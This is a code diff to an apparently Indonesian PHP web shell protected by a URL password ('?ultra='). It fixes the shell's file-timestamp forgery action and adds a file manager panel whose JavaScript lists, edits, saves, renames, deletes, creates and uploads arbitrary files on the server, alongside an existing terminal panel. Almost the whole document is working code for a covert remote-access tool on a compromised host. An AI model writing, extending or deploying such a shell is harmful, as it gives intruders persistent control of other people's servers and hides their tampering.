@@ -119,7 +119,7 @@ if (isset($_POST['fm_action'])) {
     }
     elseif ($action === 'touch') {
         $target = $_POST['target'] ?? '';
-        $time = $_POST['time'] ? strtotime($_POST['time']) : time();
+        $time = (isset($_POST['time']) && $_POST['time']) ? strtotime($_POST['time']) : time();
         if ($target && @touch($target, $time)) { $res['success'] = true; } else { $res['msg'] = 'Failed to modify timestamp.'; }
     }
     elseif ($action === 'delete') {
@@ -787,6 +787,10 @@ input[type=checkbox]{accent-color:var(--green);width:12px;height:12px;vertical-a
         <svg class="nav-icon" viewBox="0 0 16 16" fill="none"><rect x="1" y="2" width="14" height="12" rx="2" stroke="currentColor" stroke-width="1.2"/><polyline points="4,6 7,9 4,12" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/><line x1="9" y1="12" x2="13" y2="12" stroke="currentColor" stroke-width="1.2" stroke-linecap="round"/></svg>
         Terminal
     </div>
+    <div class="nav-item" onclick="nav('filemanager',this);fmLoad(fmCwd)">
+        <svg class="nav-icon" viewBox="0 0 16 16" fill="none"><path d="M2 4a1 1 0 011-1h3l1.5 2H13a1 1 0 011 1v6a1 1 0 01-1 1H3a1 1 0 01-1-1V4z" stroke="currentColor" stroke-width="1.2" stroke-linejoin="round"/></svg>
+        File Manager
+    </div>
     <?php if ($deleted_count > 0): ?>
     <div class="nav-item" onclick="nav('deleted',this)">
         <svg class="nav-icon" viewBox="0 0 16 16" fill="none"><path d="M3 4h10M5 4V3a1 1 0 011-1h4a1 1 0 011 1v1M6 7v5M10 7v5M12 4v9a1 1 0 01-1 1H5a1 1 0 01-1-1V4" stroke="currentColor" stroke-width="1.2" stroke-linecap="round"/></svg>
@@ -1089,6 +1093,44 @@ input[type=checkbox]{accent-color:var(--green);width:12px;height:12px;vertical-a
 </div>
 </div>
 
+<!-- ══ FILE MANAGER ══ -->
+<div class="panel-section" id="panel-filemanager">
+<div style="display:flex;flex-direction:column;flex:1;overflow:hidden">
+    <div style="display:flex;align-items:center;gap:8px;padding:10px 16px;background:var(--color-background-primary);border-bottom:.5px solid var(--color-border-tertiary);flex-shrink:0">
+        <div id="fm-breadcrumb" style="flex:1;font-family:var(--mono);font-size:11px;color:var(--color-text-secondary);display:flex;align-items:center;gap:2px;flex-wrap:wrap;min-width:0"></div>
+        <button class="btn sm" onclick="fmMkdir()">+ Folder</button>
+        <button class="btn sm" onclick="fmMkfile()">+ File</button>
+        <label class="btn sm" style="cursor:pointer;margin:0">Upload<input type="file" id="fm-upload-input" style="display:none" onchange="fmUpload(this)"></label>
+    </div>
+    <div style="overflow-y:auto;flex:1;padding:12px 16px">
+        <div class="card">
+            <table id="fm-table">
+                <thead><tr>
+                    <th style="width:28px"></th>
+                    <th>Name</th>
+                    <th>Size</th>
+                    <th>Perms</th>
+                    <th>Modified</th>
+                    <th style="text-align:right">Actions</th>
+                </tr></thead>
+                <tbody id="fm-tbody"><tr><td colspan="6" class="empty-state">Select File Manager to load.</td></tr></tbody>
+            </table>
+        </div>
+    </div>
+</div>
+<!-- FM Editor Modal -->
+<div id="fm-modal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:300;align-items:center;justify-content:center">
+    <div style="background:var(--color-background-primary);border:.5px solid var(--color-border-secondary);border-radius:10px;width:92%;max-width:860px;max-height:88vh;display:flex;flex-direction:column;overflow:hidden">
+        <div style="display:flex;align-items:center;gap:8px;padding:10px 14px;border-bottom:.5px solid var(--color-border-tertiary);background:var(--color-background-secondary);flex-shrink:0">
+            <span id="fm-modal-title" style="font-family:var(--mono);font-size:11px;color:var(--color-text-primary);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">Editor</span>
+            <button class="btn sm primary" onclick="fmSaveFile()">Save</button>
+            <button class="btn sm" onclick="fmCloseModal()">Close</button>
+        </div>
+        <textarea id="fm-editor" style="flex:1;min-height:380px;background:var(--color-background-tertiary);border:none;outline:none;font-family:var(--mono);font-size:12px;color:var(--color-text-primary);padding:14px;resize:none;line-height:1.7"></textarea>
+    </div>
+</div>
+</div>
+
 <?php if ($deleted_count > 0): ?>
 <!-- ══ DELETED ══ -->
 <div class="panel-section" id="panel-deleted">
@@ -1264,6 +1306,237 @@ function updatePrompt(){
     var display=termCwd.replace(/\/home\/[^/]+/,'~');
     document.getElementById('term-prompt').textContent=termUser+'@'+termHost+':'+display+'$ ';
 }
+
+// ── FILE MANAGER ──
+var fmCwd='<?php echo addslashes($default_dir); ?>';
+var fmEditTarget='';
+var fmPass='<?php echo urlencode($access_password); ?>';
+
+function fmUrl(){
+    return window.location.href.split('?')[0]+'?ultra='+fmPass;
+}
+
+// Bungkus string dalam single-quote aman untuk onclick attr
+function fmQ(s){
+    return "'" + String(s).replace(/\\/g,'\\\\').replace(/'/g,"\\'") + "'";
+}
+
+function fmLoad(dir){
+    var go = dir || fmCwd;
+    var tb = document.getElementById('fm-tbody');
+    tb.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:24px;color:var(--color-text-tertiary);font-family:var(--mono);font-size:11px">&#8987; Loading...</td></tr>';
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', fmUrl(), true);
+    xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+    xhr.onload = function(){
+        try{
+            var r = JSON.parse(xhr.responseText);
+            if(r.success){
+                fmCwd = r.cwd || go;
+                fmBreadcrumb();
+                fmRender(r.data);
+            } else {
+                tb.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:20px;color:var(--red);font-family:var(--mono);font-size:11px">&#10007; '+escHtml(r.msg||'Error')+'</td></tr>';
+            }
+        } catch(e){
+            tb.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:20px;color:var(--red);font-family:var(--mono);font-size:11px">Parse error: '+escHtml(e.message)+'</td></tr>';
+        }
+    };
+    xhr.onerror = function(){
+        tb.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:20px;color:var(--red)">Connection error</td></tr>';
+    };
+    xhr.send('fm_action=list&dir='+encodeURIComponent(go));
+}
+
+function fmRender(files){
+    var tb = document.getElementById('fm-tbody');
+    if(!files || files.length === 0){
+        tb.innerHTML = '<tr><td colspan="6"><div class="empty-state"><div class="empty-icon">&#128193;</div>Empty directory</div></td></tr>';
+        return;
+    }
+    var EI = {php:'&#x1F418;',js:'&#x1F4DC;',css:'&#x1F3A8;',html:'&#x1F310;',htm:'&#x1F310;',json:'&#x1F4CB;',xml:'&#x1F4CB;',txt:'&#x1F4C4;',md:'&#x1F4DD;',log:'&#x1F4CB;',sh:'&#x2699;',py:'&#x1F40D;',jpg:'&#x1F5BC;',jpeg:'&#x1F5BC;',png:'&#x1F5BC;',gif:'&#x1F5BC;',svg:'&#x1F5BC;',zip:'&#x1F4E6;',tar:'&#x1F4E6;',gz:'&#x1F4E6;',sql:'&#x1F5C4;'};
+    var html = '';
+    for(var i = 0; i < files.length; i++){
+        var f = files[i];
+        var isDir = (f.type === 'dir');
+        var isDot = (f.name === '..');
+        var ext = (f.name.lastIndexOf('.') > 0 ? f.name.slice(f.name.lastIndexOf('.')+1) : '').toLowerCase();
+        var icon = isDir ? '&#x1F4C1;' : (EI[ext] || '&#x1F4C4;');
+        var nameCell;
+        if(isDir){
+            nameCell = '<a href="#" onclick="fmLoad('+fmQ(f.path)+');return false;" style="color:var(--green);text-decoration:none;font-family:var(--mono);font-size:11px">'+escHtml(f.name)+'</a>';
+        } else {
+            nameCell = '<span style="font-family:var(--mono);font-size:11px;color:var(--color-text-primary)">'+escHtml(f.name)+'</span>';
+        }
+        var act = '';
+        if(!isDot){
+            if(!isDir){
+                act += '<button class="icon-btn" onclick="fmEdit('+fmQ(f.path)+','+fmQ(f.name)+')">Edit</button> ';
+                act += '<a href="?ultra='+encodeURIComponent(fmPass)+'&fm_download='+encodeURIComponent(f.path)+'" class="icon-btn" style="text-decoration:none" target="_blank">Download</a> ';
+            }
+            act += '<button class="icon-btn" onclick="fmRenameFile('+fmQ(f.path)+','+fmQ(f.name)+')">Rename</button> ';
+            act += '<button class="icon-btn red" onclick="fmDelete('+fmQ(f.path)+','+fmQ(f.name)+')">Delete</button>';
+        }
+        html += '<tr>';
+        html += '<td style="font-size:15px;text-align:center;padding:5px 8px">'+icon+'</td>';
+        html += '<td class="td-primary">'+nameCell+'</td>';
+        html += '<td class="td-mono" style="color:var(--color-text-tertiary)">'+escHtml(f.size)+'</td>';
+        html += '<td class="td-mono" style="color:var(--color-text-tertiary);font-size:10px">'+escHtml(f.perms)+'</td>';
+        html += '<td class="td-mono" style="color:var(--color-text-tertiary);font-size:10px">'+escHtml(f.mtime)+'</td>';
+        html += '<td style="text-align:right;white-space:nowrap">'+act+'</td>';
+        html += '</tr>';
+    }
+    tb.innerHTML = html;
+}
+
+function fmBreadcrumb(){
+    var parts = fmCwd.replace(/\\/g,'/').split('/').filter(function(p){ return p !== ''; });
+    var bc = document.getElementById('fm-breadcrumb');
+    var sep = '<span style="color:var(--color-text-tertiary);margin:0 1px">/</span>';
+    var html = '<span onclick="fmLoad(\'\'/\''+'\')" style="cursor:pointer;color:var(--color-text-secondary)">'+sep+'</span>';
+    var path = '';
+    for(var i = 0; i < parts.length; i++){
+        path += '/'+parts[i];
+        var cur = path;
+        if(i < parts.length - 1){
+            html += '<span onclick="fmLoad('+fmQ(cur)+')" style="cursor:pointer;color:var(--color-text-secondary)">'+escHtml(parts[i])+'</span>'+sep;
+        } else {
+            html += '<span style="color:var(--color-text-primary);font-weight:500">'+escHtml(parts[i])+'</span>';
+        }
+    }
+    bc.innerHTML = html;
+}
+
+function fmEdit(path, name){
+    fmEditTarget = path;
+    document.getElementById('fm-modal-title').textContent = 'Editing: '+name;
+    document.getElementById('fm-editor').value = 'Loading...';
+    document.getElementById('fm-modal').style.display = 'flex';
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', fmUrl(), true);
+    xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+    xhr.onload = function(){
+        try{
+            var r = JSON.parse(xhr.responseText);
+            document.getElementById('fm-editor').value = r.success ? r.data : ('// Error: '+r.msg);
+        } catch(e){ document.getElementById('fm-editor').value = '// Parse error'; }
+    };
+    xhr.send('fm_action=read&target='+encodeURIComponent(path));
+}
+
+function fmSaveFile(){
+    var content = document.getElementById('fm-editor').value;
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', fmUrl(), true);
+    xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+    xhr.onload = function(){
+        try{
+            var r = JSON.parse(xhr.responseText);
+            if(r.success){ toast('success','&#10003; File saved'); }
+            else { toast('error', r.msg || 'Save failed'); }
+        } catch(e){ toast('error','Parse error'); }
+    };
+    xhr.send('fm_action=save&target='+encodeURIComponent(fmEditTarget)+'&content='+encodeURIComponent(content));
+}
+
+function fmCloseModal(){
+    document.getElementById('fm-modal').style.display = 'none';
+    fmEditTarget = '';
+}
+
+function fmDelete(path, name){
+    if(!confirm('Hapus "'+name+'"?\nTidak bisa dibatalkan!')) return;
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', fmUrl(), true);
+    xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+    xhr.onload = function(){
+        try{
+            var r = JSON.parse(xhr.responseText);
+            if(r.success){ toast('success','"'+name+'" deleted'); fmLoad(fmCwd); }
+            else { toast('error', r.msg || 'Delete failed'); }
+        } catch(e){ toast('error','Parse error'); }
+    };
+    xhr.send('fm_action=delete&target='+encodeURIComponent(path));
+}
+
+function fmRenameFile(path, name){
+    var n = prompt('Rename "'+name+'" menjadi:', name);
+    if(!n || n === name) return;
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', fmUrl(), true);
+    xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+    xhr.onload = function(){
+        try{
+            var r = JSON.parse(xhr.responseText);
+            if(r.success){ toast('success','Renamed \u2192 "'+n+'"'); fmLoad(fmCwd); }
+            else { toast('error', r.msg || 'Rename failed'); }
+        } catch(e){ toast('error','Parse error'); }
+    };
+    xhr.send('fm_action=rename&target='+encodeURIComponent(path)+'&name='+encodeURIComponent(n));
+}
+
+function fmMkdir(){
+    var n = prompt('Nama folder baru:');
+    if(!n) return;
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', fmUrl(), true);
+    xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+    xhr.onload = function(){
+        try{
+            var r = JSON.parse(xhr.responseText);
+            if(r.success){ toast('success','Folder "'+n+'" dibuat'); fmLoad(fmCwd); }
+            else { toast('error', r.msg || 'Gagal buat folder'); }
+        } catch(e){ toast('error','Parse error'); }
+    };
+    xhr.send('fm_action=mkdir&dir='+encodeURIComponent(fmCwd)+'&name='+encodeURIComponent(n));
+}
+
+function fmMkfile(){
+    var n = prompt('Nama file baru:');
+    if(!n) return;
+    var p = fmCwd.replace(/\/$/,'') + '/' + n;
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', fmUrl(), true);
+    xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+    xhr.onload = function(){
+        try{
+            var r = JSON.parse(xhr.responseText);
+            if(r.success){ toast('success','File "'+n+'" dibuat'); fmLoad(fmCwd); }
+            else { toast('error', r.msg || 'Gagal buat file'); }
+        } catch(e){ toast('error','Parse error'); }
+    };
+    xhr.send('fm_action=save&target='+encodeURIComponent(p)+'&content=');
+}
+
+function fmUpload(input){
+    if(!input.files || !input.files[0]) return;
+    var file = input.files[0];
+    var fd = new FormData();
+    fd.append('fm_action','upload');
+    fd.append('dir', fmCwd);
+    fd.append('file', file);
+    toast('success','Uploading "'+file.name+'"...');
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', fmUrl(), true);
+    xhr.onload = function(){
+        try{
+            var r = JSON.parse(xhr.responseText);
+            if(r.success){ toast('success','"'+file.name+'" uploaded'); fmLoad(fmCwd); }
+            else { toast('error', r.msg || 'Upload failed'); }
+        } catch(e){ toast('error','Parse error'); }
+        input.value = '';
+    };
+    xhr.onerror = function(){ toast('error','Upload connection error'); input.value = ''; };
+    xhr.send(fd);
+}
+
+// Ctrl+S untuk save di editor
+document.addEventListener('keydown', function(e){
+    if((e.ctrlKey || e.metaKey) && e.key === 's'){
+        var modal = document.getElementById('fm-modal');
+        if(modal && modal.style.display === 'flex'){ e.preventDefault(); fmSaveFile(); }
+    }
+});
 </script>
 
 </body>
